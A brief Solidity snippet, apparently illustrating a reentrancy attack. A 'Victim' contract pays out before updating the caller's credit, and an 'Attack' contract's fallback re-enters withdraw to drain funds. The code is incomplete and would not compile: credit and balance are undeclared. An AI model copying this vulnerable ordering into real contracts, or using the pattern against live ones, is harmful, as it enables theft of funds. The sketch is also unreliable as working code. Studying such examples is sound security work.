contract Victim{


  function donate() public payable 
  {
    credit[msg.sender] += msg.value;
  }


  function withdraw(uint amount) public {

    if (credit[msg.sender] >= amount)
    {
      (bool success, ) = msg.sender.call.value(amount)("");
      require(success);
      credit[msg.sender] -= amount;
    }
  }

}

contract Attack{
  Victim victim;

  function () payable {
     victim.withdraw.value(0)(balance);
  }
}

